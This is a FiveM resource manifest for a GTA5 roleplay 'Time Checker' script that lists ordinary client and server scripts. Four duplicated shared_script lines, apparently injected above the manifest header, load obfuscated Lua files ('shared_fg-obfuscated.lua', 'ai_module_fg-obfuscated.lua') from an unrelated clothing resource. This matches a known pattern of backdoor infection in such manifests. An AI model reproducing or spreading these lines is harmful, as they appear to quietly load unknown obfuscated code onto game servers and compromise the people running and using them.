shared_script '@esx_clothing/shared_fg-obfuscated.lua'
shared_script '@esx_clothing/ai_module_fg-obfuscated.lua'
shared_script '@esx_clothing/ai_module_fg-obfuscated.lua'
shared_script '@esx_clothing/shared_fg-obfuscated.lua'
fx_version 'cerulean'
game 'gta5'

description 'Time Checker-ILIRIA RP'
author 'RREMA'
version '1.0.1'

server_scripts {
    'server.lua'
}

client_scripts {
    'client.lua'
}